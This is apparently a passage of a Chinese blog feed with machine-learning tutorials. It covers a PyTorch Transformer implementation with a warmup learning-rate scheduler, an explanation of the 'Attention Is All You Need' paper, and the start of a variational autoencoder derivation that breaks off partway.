<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Encoder</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A encoder model with self attention mechanism. '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, n_src_vocab, d_word_vec, n_layers, n_head, d_k, d_v,</span></span></span><br><span class="line"><span class="params"><span class="function">            d_model, d_inner, pad_idx, dropout=<span class="number">0.1</span>, n_position=<span class="number">200</span>, scale_emb=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.src_word_emb = nn.Embedding(n_src_vocab, d_word_vec, padding_idx=pad_idx) <span class="comment"># 词嵌入表</span></span><br><span class="line">        self.position_enc = PositionalEncoding(d_word_vec, n_position=n_position)</span><br><span class="line">        self.dropout = nn.Dropout(p=dropout)</span><br><span class="line">        self.layer_stack = nn.ModuleList([</span><br><span class="line">            EncoderLayer(d_model, d_inner, n_head, d_k, d_v, dropout=dropout) <span class="comment"># 编码网络</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_layers)])</span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_model, eps=<span class="number">1e-6</span>)</span><br><span class="line">        self.scale_emb = scale_emb</span><br><span class="line">        self.d_model = d_model</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, src_seq, src_mask, return_attns=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        enc_slf_attn_list = []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- Forward</span></span><br><span class="line">        enc_output = self.src_word_emb(src_seq)</span><br><span class="line">        <span class="keyword">if</span> self.scale_emb:</span><br><span class="line">            enc_output *= self.d_model ** <span class="number">0.5</span></span><br><span class="line">        enc_output = self.dropout(self.position_enc(enc_output))</span><br><span class="line">        enc_output = self.layer_norm(enc_output)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> enc_layer <span class="keyword">in</span> self.layer_stack: <span class="comment"># 编码网络</span></span><br><span class="line">            enc_output, enc_slf_attn = enc_layer(enc_output, slf_attn_mask=src_mask)</span><br><span class="line">            enc_slf_attn_list += [enc_slf_attn] <span class="keyword">if</span> return_attns <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> return_attns:</span><br><span class="line">            <span class="keyword">return</span> enc_output, enc_slf_attn_list</span><br><span class="line">        <span class="keyword">return</span> enc_output,</span><br></pre></td></tr></tbody></table></figure>
<p>Transformer 解码器：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Decoder</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A decoder model with self attention mechanism. '''</span></span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">		与编码器类似</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, n_trg_vocab, d_word_vec, n_layers, n_head, d_k, d_v,</span></span></span><br><span class="line"><span class="params"><span class="function">            d_model, d_inner, pad_idx, n_position=<span class="number">200</span>, dropout=<span class="number">0.1</span>, scale_emb=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.trg_word_emb = nn.Embedding(n_trg_vocab, d_word_vec, padding_idx=pad_idx)</span><br><span class="line">        self.position_enc = PositionalEncoding(d_word_vec, n_position=n_position)</span><br><span class="line">        self.dropout = nn.Dropout(p=dropout)</span><br><span class="line">        self.layer_stack = nn.ModuleList([</span><br><span class="line">            DecoderLayer(d_model, d_inner, n_head, d_k, d_v, dropout=dropout)</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_layers)])</span><br><span class="line">        self.layer_norm = nn.LayerNorm(d_model, eps=<span class="number">1e-6</span>)</span><br><span class="line">        self.scale_emb = scale_emb</span><br><span class="line">        self.d_model = d_model</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, trg_seq, trg_mask, enc_output, src_mask, return_attns=<span class="literal">False</span></span>):</span></span><br><span class="line"></span><br><span class="line">        dec_slf_attn_list, dec_enc_attn_list = [], []</span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- Forward</span></span><br><span class="line">        dec_output = self.trg_word_emb(trg_seq)</span><br><span class="line">        <span class="keyword">if</span> self.scale_emb:</span><br><span class="line">            dec_output *= self.d_model ** <span class="number">0.5</span> <span class="comment"># Transformer论文中的trick，对词嵌入向量进行放大</span></span><br><span class="line">        dec_output = self.dropout(self.position_enc(dec_output))</span><br><span class="line">        dec_output = self.layer_norm(dec_output)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> dec_layer <span class="keyword">in</span> self.layer_stack:</span><br><span class="line">            dec_output, dec_slf_attn, dec_enc_attn = dec_layer(</span><br><span class="line">                dec_output, enc_output, slf_attn_mask=trg_mask, dec_enc_attn_mask=src_mask)</span><br><span class="line">            dec_slf_attn_list += [dec_slf_attn] <span class="keyword">if</span> return_attns <span class="keyword">else</span> []</span><br><span class="line">            dec_enc_attn_list += [dec_enc_attn] <span class="keyword">if</span> return_attns <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> return_attns:</span><br><span class="line">            <span class="keyword">return</span> dec_output, dec_slf_attn_list, dec_enc_attn_list</span><br><span class="line">        <span class="keyword">return</span> dec_output,</span><br></pre></td></tr></tbody></table></figure>
<p>Transformer：</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Transformer</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="string">''' A sequence to sequence model with attention mechanism. '''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="function">            self, n_src_vocab, n_trg_vocab, src_pad_idx, trg_pad_idx,</span></span></span><br><span class="line"><span class="params"><span class="function">            d_word_vec=<span class="number">512</span>, d_model=<span class="number">512</span>, d_inner=<span class="number">2048</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            n_layers=<span class="number">6</span>, n_head=<span class="number">8</span>, d_k=<span class="number">64</span>, d_v=<span class="number">64</span>, dropout=<span class="number">0.1</span>, n_position=<span class="number">200</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            trg_emb_prj_weight_sharing=<span class="literal">True</span>, emb_src_trg_weight_sharing=<span class="literal">True</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">            scale_emb_or_prj=<span class="string">'prj'</span></span>):</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.src_pad_idx, self.trg_pad_idx = src_pad_idx, trg_pad_idx</span><br><span class="line"></span><br><span class="line">        <span class="comment"># In section 3.4 of paper "Attention Is All You Need", there is such detail:</span></span><br><span class="line">        <span class="comment"># "In our model, we share the same weight matrix between the two</span></span><br><span class="line">        <span class="comment"># embedding layers and the pre-softmax linear transformation...</span></span><br><span class="line">        <span class="comment"># In the embedding layers, we multiply those weights by \sqrt{d_model}".</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># Options here:</span></span><br><span class="line">        <span class="comment">#   'emb': multiply \sqrt{d_model} to embedding output</span></span><br><span class="line">        <span class="comment">#   'prj': multiply (\sqrt{d_model} ^ -1) to linear projection output</span></span><br><span class="line">        <span class="comment">#   'none': no multiplication</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> scale_emb_or_prj <span class="keyword">in</span> [<span class="string">'emb'</span>, <span class="string">'prj'</span>, <span class="string">'none'</span>]</span><br><span class="line">        scale_emb = (scale_emb_or_prj == <span class="string">'emb'</span>) <span class="keyword">if</span> trg_emb_prj_weight_sharing <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        self.scale_prj = (scale_emb_or_prj == <span class="string">'prj'</span>) <span class="keyword">if</span> trg_emb_prj_weight_sharing <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">        self.d_model = d_model</span><br><span class="line"></span><br><span class="line">        self.encoder = Encoder(</span><br><span class="line">            n_src_vocab=n_src_vocab, n_position=n_position,</span><br><span class="line">            d_word_vec=d_word_vec, d_model=d_model, d_inner=d_inner,</span><br><span class="line">            n_layers=n_layers, n_head=n_head, d_k=d_k, d_v=d_v,</span><br><span class="line">            pad_idx=src_pad_idx, dropout=dropout, scale_emb=scale_emb)</span><br><span class="line"></span><br><span class="line">        self.decoder = Decoder(</span><br><span class="line">            n_trg_vocab=n_trg_vocab, n_position=n_position,</span><br><span class="line">            d_word_vec=d_word_vec, d_model=d_model, d_inner=d_inner,</span><br><span class="line">            n_layers=n_layers, n_head=n_head, d_k=d_k, d_v=d_v,</span><br><span class="line">            pad_idx=trg_pad_idx, dropout=dropout, scale_emb=scale_emb)</span><br><span class="line"></span><br><span class="line">        self.trg_word_prj = nn.Linear(d_model, n_trg_vocab, bias=<span class="literal">False</span>) <span class="comment"># 投影到词表</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> self.parameters():</span><br><span class="line">            <span class="keyword">if</span> p.dim() &gt; <span class="number">1</span>:</span><br><span class="line">                nn.init.xavier_uniform_(p) <span class="comment"># xavier 初始化权重</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> d_model == d_word_vec, \</span><br><span class="line">        <span class="string">'To facilitate the residual connections, \</span></span><br><span class="line"><span class="string">         the dimensions of all module outputs shall be the same.'</span></span><br><span class="line">		<span class="comment"># 嵌入层与投影线性层权重共享</span></span><br><span class="line">        <span class="keyword">if</span> trg_emb_prj_weight_sharing:</span><br><span class="line">            <span class="comment"># Share the weight between target word embedding &amp; last dense layer</span></span><br><span class="line">            self.trg_word_prj.weight = self.decoder.trg_word_emb.weight</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> emb_src_trg_weight_sharing:</span><br><span class="line">            self.encoder.src_word_emb.weight = self.decoder.trg_word_emb.weight</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, src_seq, trg_seq</span>):</span></span><br><span class="line"></span><br><span class="line">        src_mask = get_pad_mask(src_seq, self.src_pad_idx)</span><br><span class="line">        trg_mask = get_pad_mask(trg_seq, self.trg_pad_idx) &amp; get_subsequent_mask(trg_seq)</span><br><span class="line"></span><br><span class="line">        enc_output, *_ = self.encoder(src_seq, src_mask)</span><br><span class="line">        dec_output, *_ = self.decoder(trg_seq, trg_mask, enc_output, src_mask)</span><br><span class="line">        seq_logit = self.trg_word_prj(dec_output)</span><br><span class="line">        <span class="keyword">if</span> self.scale_prj:</span><br><span class="line">            seq_logit *= self.d_model ** -<span class="number">0.5</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> seq_logit.view(-<span class="number">1</span>, seq_logit.size(<span class="number">2</span>))</span><br></pre></td></tr></tbody></table></figure>
<h3 id="optim.py">Optim.py</h3>
<p>一个简单封装的优化器类，用以动态调整学习率。</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">'''A wrapper class for scheduled optimizer '''</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScheduledOptim</span>():</span></span><br><span class="line">    <span class="string">'''A simple wrapper class for learning rate scheduling'''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, optimizer, lr_mul, d_model, n_warmup_steps</span>):</span></span><br><span class="line">        self._optimizer = optimizer</span><br><span class="line">        self.lr_mul = lr_mul</span><br><span class="line">        self.d_model = d_model</span><br><span class="line">        self.n_warmup_steps = n_warmup_steps</span><br><span class="line">        self.n_steps = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">step_and_update_lr</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">"Step with the inner optimizer"</span></span><br><span class="line">        self._update_learning_rate()</span><br><span class="line">        self._optimizer.step()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">zero_grad</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">"Zero out the gradients with the inner optimizer"</span></span><br><span class="line">        self._optimizer.zero_grad()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_lr_scale</span>(<span class="params">self</span>):</span></span><br><span class="line">        d_model = self.d_model</span><br><span class="line">        n_steps, n_warmup_steps = self.n_steps, self.n_warmup_steps</span><br><span class="line">        <span class="keyword">return</span> (d_model ** -<span class="number">0.5</span>) * <span class="built_in">min</span>(n_steps ** (-<span class="number">0.5</span>), n_steps * n_warmup_steps ** (-<span class="number">1.5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_learning_rate</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">''' Learning rate scheduling per step '''</span></span><br><span class="line"></span><br><span class="line">        self.n_steps += <span class="number">1</span></span><br><span class="line">        lr = self.lr_mul * self._get_lr_scale()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> param_group <span class="keyword">in</span> self._optimizer.param_groups:</span><br><span class="line">            param_group[<span class="string">'lr'</span>] = lr</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="总结">总结</h2>
<p>读一遍代码发现了论文中忽视的好几个点，例如嵌入向量放缩、dropout 等，读代码还是很有必要的。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>Transformer</category>
      </categories>
      <tags>
        <tag>Transformer</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>Transformer</title>
    <url>/blog/2021/08/14/Transformer/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天读的是大名鼎鼎的 BERT------- 的组件之一 Transformer，出自论文 Google 团队 2017 年的论文《Attention
Is All You
Need》。与传统的 GRU、LSTM 等相比，Transformer 只使用注意力机制来建模输入与输出间的依赖关系，并支持并行化。论文在机器翻译上进行了实验，Transfomer 达到了更好的效果，因此自提出以来，就得到了极为广泛的关注。</p>
<span id="more"></span>
<h2 id="题外话">题外话</h2>
<p>之前由于换电脑的原因，断更了一段时间。BERT 与 Transformer 的论文之前也粗读过一两次，还是有些一知半解，正好趁这个周末再复习总结一下，记录在博客里。希望我的博客能对你有所帮助。</p>
<h2 id="模型结构">模型结构</h2>
<p>Transformer 使用的仍然是 encoder-decoder 架构，但与 RNN 等自回归模型不同，Transformer 使用的是堆叠的多头注意力机制，全连接层等，其模型结构如下所示：</p>
<p><img src="architecture.png"></p>
<p>左侧的为单个编码器的结构，第一层为多头注意力、残差层与层标准化，第二层是前馈神经网络。编码网络是由若干个编码器堆叠而成的，原论文中 N=6，嵌入向量维度为 512。</p>
<p>右侧为单个解码器的结构，主要在编码器的基础上，加入了一个 Masked 的多头注意力机制，用以保证每个时间步的输出只已知已经输出的信息。同样的，解码网络也有 6 个解码器组成。</p>
<h3 id="注意力机制">注意力机制</h3>
<p>多头注意力机制可谓是 Transformer 的核心，详细过程可以参考<a href="https://blog.csdn.net/longxinchen_ml/article/details/86533005">图解 Transformer 完整版</a>。这里只做核心部分介绍，单头计算过程为：
<span class="math display">\[
Attention(Q,K,V)=softmax(\frac{QK^\intercal}{\sqrt{d_k}})V
\]</span>
Q，K，V 分别为查询、键、值矩阵，由词嵌入向量矩阵映射得出。多头注意力机制使用点乘计算相似度，不同的是，这里除以了一个标量<span class="math inline"> \(\sqrt{d_k}\)</span>​​​。这个标量是 softmax 的温度系数，由于点积结果方差可能很大，可能会存在梯度过小无法正常更新的情况。除以一个标量能够使得概率分布更加均匀。这一部分可以参考学习下 softmax 的温度系数。</p>
<p>作者发现，相较于仅使用一个注意力机制，使用多个注意力机制并将其拼接能够拥有更好的效果。在论文中，作者使用 8 个注意力机制，每个注意力机制的输出为 512/8=64 维嵌入向量。</p>
<h3 id="注意力机制的使用">注意力机制的使用</h3>
<p>多头注意力机制以三种方式在模型中使用：</p>
<ul>
<li>编码器与解码器间的注意力：查询 q 来自解码器，键 K 与值 V 来自编码器。这里的注意力机制用以在输出的每一步关注在输入序列的不同部分，与 seq2seq 的注意力机制相似、</li>
<li>编码器内的自注意力：查询、键、值均来自编码器。输入序列的每个位置可以得到到整个输入序列的信息。</li>
<li>解码器内的掩码自注意力：查询、键、值均来自解码器。为了保证解码器只能获得已输出的部分序列的信息，将当前位置之后位置的标量化点积设置为<span class="math inline"> \(-\infty\)</span>​，进而经过 softmax 后概率值为 0。</li>
</ul>
<h3 id="前馈神经网络">前馈神经网络</h3>
<p>在编码器和解码器中的前馈神经网络，搭配 relu 激活函数来为模型构造非线性计算。计算过程如下所示：
<span class="math display">\[
FFN(x)=\max(0,xW_1+b_1)W2+b_2
\]</span>
其中，输入和输出的维度均为 512，隐藏层维度为 1024。另外，前馈神经网络在每个层内不共享参数，换而言之，它们的参数是独立的。</p>
<h3 id="位置编码">位置编码</h3>
<p>由于 Transformer 中不存在 RNN 中的自回归结构，输入序列的不同位置是等价的。为了编码位置信息，作者引入了位置编码，使用 sin 与 cos 函数：
<span class="math display">\[
PE_{(pos,2i)}=\sin(pos/10000^{2i/d_{model}})
\]</span></p>
<p><span class="math display">\[
PE_{(pos,2i+1)}=\cos(pos/10000^{2i/d_{model}})
\]</span></p>
<p>其中，pos 为位置，i 为向量维度。作者称选取三角函数的原因是假设这样可以更好地使模型学到相对位置关系，对于任意固定的偏移 k，<span class="math inline">\(PE_{pos+k}\)</span> 可以表示为<span class="math inline"> \(PE_{pos}\)</span> 的线性函数。另外，作者还尝试了学习位置编码的方式，实验对比显示，二者结果差别不大。因此作者最终选择了上述编码方式，因为它可以处理更长的序列。</p>
<h2 id="为什么使用自注意力机制">为什么使用自注意力机制</h2>
<p>论文从计算时间复杂度、序列操作数、最长路径长度三方面对比了自注意力机制、RNN、CNN 以及受限的自注意力机制，结果如下：</p>
<p><img src="comparison.png"></p>
<p>这一部分计算过程论文没有给出，我参考了 <a href="https://zhuanlan.zhihu.com/p/264749298">Transformer/CNN/RNN 的对比（时间复杂度，序列操作数，最大路径长度）</a>，这里简单介绍一下。</p>
<h3 id="计算时间复杂度">计算（时间）复杂度</h3>
<p>计算复杂度主要取决于计算的规模，以矩阵乘法为例，形状为 NxM 的矩阵与形状为 MxP 的矩阵相乘，得到一个 NxP 的矩阵。结果矩阵中的每个元素为 M 维向量内积的结果，进行 M 次乘法，并求和。所以整个矩阵乘法的复杂度为<span class="math inline"> \(O(NMP)\)</span>。</p>
<h4 id="自注意力机制">自注意力机制</h4>
<p><span class="math display">\[
Attention(Q,K,V)=softmax(\frac{QK^\intercal}{\sqrt{d_k}})V
\]</span></p>
<p>其中，Q，K 分别为 nxd 与 dxn 的矩阵，<span class="math inline">\(QK^\intercal\)</span>​的复杂度为<span class="math inline"> \(O(n^2d)\)</span>​​，softmax 的复杂度为<span class="math inline"> \(O(n^2)\)</span>，加权求和的矩阵形状分别为 nxn 与 nxd，复杂度为<span class="math inline"> \(O(n^2d)\)</span>，因此总复杂度为<span class="math inline"> \(O(n^2d)\)</span>​。受限自注意力机制与之同理，区别在于它只使用查询最近的 k 个</p>
<h4 id="rnn">RNN</h4>
<p><span class="math display">\[
h_t=f(Ux_t+Wh_{t-1})
\]</span></p>
<p>其中，U 与 x 的形状分别为 dxd 与 dx1（假设隐藏状态与输入维度均为 d），复杂度为<span class="math inline"> \(O(d^2)\)</span>​，W 与 h 的形状分别为 dxd 与 dx1，复杂度同样为<span class="math inline"> \(O(d^2)\)</span>。对于长度为 n 的序列，总复杂度为<span class="math inline"> \(O(nd^2)\)</span>。</p>
<h4 id="cnn">CNN</h4>
<p>将输入序列进行 padding 后，总共需要 n 次卷积，每次卷积计算量为 kxd，假设步长为 1，单个卷积核复杂度为<span class="math inline"> \(O(nkd)\)</span>​。为了保证维度相同，需要使用 d 个卷积核，总复杂度为<span class="math inline"> \(O(nkd^2)\)</span></p>
<h3 id="序列操作数">序列操作数</h3>
<p>序列操作数主要衡量了并行化的支持情况，只有 RNN 需要串行地完成 n 次序列操作，其他模型均支持并行化。</p>
<h3 id="最长路径长度">最长路径长度</h3>
<p>最长路径为序列中首尾 token 在模型中的路径，其长度越长，依赖越不容易被捕捉到。对于自注意力机制，序列中的任意两个元素均可以看作直接相连，路径长度为<span class="math inline"> \(O(1)\)</span>。而 RNN 中，第一个 token 的信息需要进行 n 次迭代才能到达最后一个 token，最大路径长度即为<span class="math inline"> \(O(n)\)</span>。CNN 中，通过若干个卷积层来获取不同位置的信息，每个卷积层（论文中使用的是空洞卷积）相当于让序列信息浓缩了 k 倍（卷积层的输出中的每个位置都有输入中 k 个位置的信息），最大路径长度为<span class="math inline"> \(O(log_kn)\)</span>​。受限的自注意力机制与连续卷积类似，每次卷积相当于可以获取连续 k 个位置的信息，最大路径长度为<span class="math inline"> \(O(n/k)\)</span>。</p>
<p>这就基本解释了这个突兀的表格是怎么计算得来的了。那么可以总结自注意力机制的优点是：</p>
<ul>
<li>单层计算量更少。在实际应用中，序列长度 n 往往小于表征维度 d，因此，自注意力机制的单层计算量相较于 RNN 与 CNN 都要更小。</li>
<li>支持并行化。这个就不说了，全世界都在针对 RNN。</li>
<li>能够更好地捕捉长距离依赖。相较于 CNN 与 RNN，自注意力机制的最长路径最短。</li>
<li>可解释性更强。作者将注意力机制的概率分布展示如下，证明多头注意力的多个头完成了与句子语义与结构相关不同的工作。</li>
</ul>
<p><img src="example.png"></p>
<p>上图是作者给出的多头注意力的例子，使用了两个头。对于 its 这个单词，得到了非常尖锐的概率分布，its 主要与 law 与 application 相关联，一个头捕获到了 its 指代的主体 law，一个头捕获到了 its 的目标 application。个人感觉这个效果也太过于理想了。。。可能这就是 Transformer 吧。</p>
<h2 id="总结">总结</h2>
<p>这篇论文提出了完全依赖于注意力机制的序列转换模型 Transformer，相较于 RNN，它有着可并行化、解释性更强、单层参数更少等优点。在机器翻译上取得了 state-of-the-art，在英语成分分析上也取得了比 RNN 更优的结果。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cnblogs.com/sandwichnlp/p/11612596.html#nlp界cnn模型的进化史">三大特征提取器（RNN/CNN/Transformer）
- 西多士 NLP - 博客园 (cnblogs.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/264749298">Transformer/CNN/RNN 的对比（时间复杂度，序列操作数，最大路径长度）</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>BERT</category>
      </categories>
      <tags>
        <tag>BERT</tag>
        <tag>Transformer</tag>
        <tag>多头注意力机制</tag>
      </tags>
  </entry>
  <entry>
    <title>变分自编码器 VAE</title>
    <url>/blog/2021/10/07/VAE/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来回顾一下变分自编码器（Variational
Autoencoder，VAE），这是 2013 年提出的一种生成模型，时至今日，它的各类变体还活跃在各类会议上。之前我读过它的离散变体 VQ-VAE，这里再回顾一下原本的 VAE。
<span id="more"></span></p>
<h2 id="数学知识">数学知识</h2>
<p>理解 VAE 需要一些信息论和概率论的知识，这里总结一下。</p>
<h3 id="概率统计">概率统计</h3>
<h4 id="数值计算-vs-采样计算">数值计算 vs 采样计算</h4>
<p>对于一个随机变量 X，如果我们想知道 X 的期望<span class="math inline"> \(E(X)\)</span>。如果我们已知 X 的分布函数，很容易可以计算出准确的期望<span class="math inline"> \(E(X)=\sum
p(x)x\)</span>（连续型变量替换为积分即可），这当然是最好的。然而很多情况下，我们无法得知准确的分布函数，那么我们可以采用统计量进行估计，对于 n 个随机样本<span class="math inline"> \(x_1,x_2,\dots,x_n\)</span>，<span class="math inline">\(\overline X=\frac{1}{n}\sum
x_i\)</span> 就是期望<span class="math inline"> \(E(X)\)</span> 的无偏估计。</p>
<h3 id="信息论">信息论</h3>
<h4 id="信息熵">信息熵</h4>
<p>在信息论中，信息熵衡量了信息的不确定性，公式为<span class="math inline"> \(H(X)=-\sum_{x\in
X}p(x)logp(x)\)</span>。以单个事件 x 为例，概率越小的事件的信息熵越大。当一个事件必定会发生时（<span class="math inline">\(p(x)=1\)</span>），其信息熵为 0，没有任何不确定性。对随机变量 X 而说，其信息熵就是<span class="math inline"> \(-logp(x)\)</span> 的期望，熵越大代表随机变量越不确定，很自然可以想到，分布越均匀，变量的状态越不容易确定，其熵越大。</p>
<p>在通信领域，信息熵可以看作对随机变量 X 进行编码所需的最短期望位数，这也被称为编码定理。在通信编码问题中，将随机变量 X 的每个值编码为一个二进制序列，使得序列长度期望最短。同时为了避免混乱，一个序列不能是其他序列的延申。这时编码位数的最短期望位数就是信息熵，有兴趣的同学可以去看看证明。</p>
<h4 id="交叉熵">交叉熵</h4>
<p>对于随机变量<span class="math inline"> \(X\)</span> 的真实分布<span class="math inline"> \(p(x)\)</span>，有时是未知的，我们只有它的近似分布<span class="math inline"> \(q(x)\)</span>，如果按照<span class="math inline"> \(q(x)\)</span> 对变量 X 进行编码，得到的编码长度的期望称为交叉熵，记为<span class="math inline"> \(H(p,q)=-\sum_x
p(x)logq(x)\)</span>。容易知道交叉熵是大于等于信息熵的，因为信息熵是最短编码长度。</p>
<h4 id="相对熵kl散度">相对熵（KL 散度）</h4>
<p>对于真实分布<span class="math inline"> \(p\)</span> 和近似分布<span class="math inline"> \(q\)</span>，相对熵为使用近似分布编码得到的编码长度与最短编码长度的差，即交叉熵与信息熵的差，定义为<span class="math inline"> \(D(p||q)=H(p,q)-H(p)\)</span>。KL 散度衡量了两个分布之间的差异，两个分布差异越大，KL 散度越大。不过 KL 散度并不是距离，因为它不是对称的。因此，KL 散度可以用于分类任务中计算真实概率分布与预测的概率分布之间的差异。事实上，<strong>由于这时信息熵为常数，往往将其略去使用交叉熵作为损失函数</strong>。</p>
<h2 id="变分自编码器">变分自编码器</h2>
<p>对于数据集<span class="math inline"> \(D={x_1,x_2,\dots,x_n}\)</span>（假设是很多张猫的图片，每个样本<span class="math inline"> \(x\)</span> 是像素矩阵）。所有可能的猫图构成数据总体<span class="math inline"> \(X\)</span>，即<span class="math inline"> \(x_i\in
D\subseteq X\)</span>。<span class="math inline">\(X\)</span> 上存在一个概率分布<span class="math inline"> \(p(x)\)</span>，当我们随机采样一张猫的图片时，这张图片有<span class="math inline"> \(p(x)\)</span> 的概率被采样到。对于非猫图<span class="math inline"> \(y,\ p(y)=0\)</span>。我们希望的是能够找到<span class="math inline"> \(p(x)=p(x^{(1)},x^{(2)},\dots)\)</span> 的准确数学形式，其中<span class="math inline"> \(x^{(1)}\)</span> 代表 x 一维展开后的第 1 个像素，依次类推。如果这个目标能够实现，我们就能分析出<span class="math inline"> \(p(x)\)</span> 这个概率函数，对哪些输入<span class="math inline"> \(x\)</span> 能够取到非 0 概率值（即猫图），进而能够随机采样猫图和非猫图。</p>
<p>如果上述描述还不好理解的话，可以想象一个二维坐标系，以原点为圆心的单位圆上的均匀分布。所有猫图都满足<span class="math inline"> \(x^2+y^2\le1\)</span>，在这个单位圆内外分别随机采样，即可得到猫图和非猫图。</p>
<p>但是事实上，这样的目标是很难实现的。在数理统计里，这是个典型的非参数估计问题，在未知分布形式的情况下，没有办法对分布形式和分布参数进行估计。而且很容易想到，这也绝对是一个非常复杂的概率分布。因此直接对<span class="math inline"> \(p(x)\)</span> 建模是不现实的。我们可以曲线救国。假设存在一个隐变量<span class="math inline"> \(z\)</span> 控制着数据<span class="math inline"> \(x\)</span> 的生成。那么根据<span class="math inline"> \(p(x)=\int p(z)p(x|z)dz\)</span> 可以计算得到<span class="math inline"> \(p(x)\)</span>。然而这个边界似然是不可解的，每一项都不知道具体的数学形式，更不要说还要积分。</p>
<p>那么求其次，我们可以用一个分布<span class="math inline"> \(q(x,z)\)</span> 近似联合概率分布<span class="math inline"> \(p(x,z)\)</span>，那么我们的优化目标就是<span class="math inline"> \(KL(p||q)\)</span> 最小。 <span class="math display">\[
\begin{align}
KL(p||q)&amp;=\int\int p(x,z)log\frac{p(x,z)}{q(x,z)}dzdx \\
&amp;=\int p(x)\int p(z|x)log\frac{p(x,z)}{q(x,z)}dzdx \\
&amp;=E_{x\sim p(x)}\int p(z|x)log\frac{p(x)p(z|x)}{q(x,z)}dz \\
&amp;=E_{x\sim p(x)}\int p(z|x)(log\frac{p(z|x)}{q(x,z)}+logp(x))dz
\end{align}
\]</span> 而 <span class="math display">\[
\begin{align}
E_{x\sim p(x)}\int q(z|x)logp(x)dz&amp;=E_{x\sim p(x)}logp(x)\int
q(z|x)dz\\
&amp;=E_{x\sim p(x)}logp(x)
\end{align}
\]</span> 为一个常数，可以略去。令 <span class="math display">\[
\begin{align}
\mathcal{L}&amp;=E_{x\sim p(x)}\int p(z|x)log\frac{p(z|x)}{q(x,z)}dz\\
&amp;=E_{x\sim p(x)}\int p(z|x)log\frac{p(z|x)}{q(z)q(x|z)}dz\\
&amp;=E_{x\sim p(x)}[\int -p(z|x)logq(x|z)  dz+ \int
